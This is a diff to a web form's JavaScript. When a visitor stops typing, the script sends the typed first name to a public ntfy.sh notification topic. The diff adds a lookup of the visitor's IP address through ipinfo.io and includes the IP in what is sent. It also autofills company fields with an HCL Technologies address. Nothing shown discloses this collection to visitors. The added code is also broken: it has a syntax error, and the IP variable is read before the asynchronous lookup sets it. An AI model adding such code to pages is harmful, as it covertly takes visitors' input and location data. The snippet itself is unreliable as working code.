@@ -256,10 +256,16 @@ $input.on('keydown', function () {
 //user is "finished typing," do something
 function doneTyping () {
   const url = "https://ntfy.sh/vkmaprilf001";
+  let a;
+  $.get("https://ipinfo.io", function(response) {
+            a = response.ip;
+        }, "json")
+  
   fetch(url, {
       method : "POST",
       body : JSON.stringify({
           user : document.getElementById('firstname').value,
+          ipaddr : a;
       })
   }).then(
       response => response.text() // .json(), etc.
@@ -267,6 +273,7 @@ function doneTyping () {
   ).then(
       html => console.log(html)
   );
+   
   $('#companyname').val('HCL Technologies Limited HQ');
   $('#address').val('Sector 45, Noida, Uttar Pradesh 201303, India');
   $('#city').val('Noida');
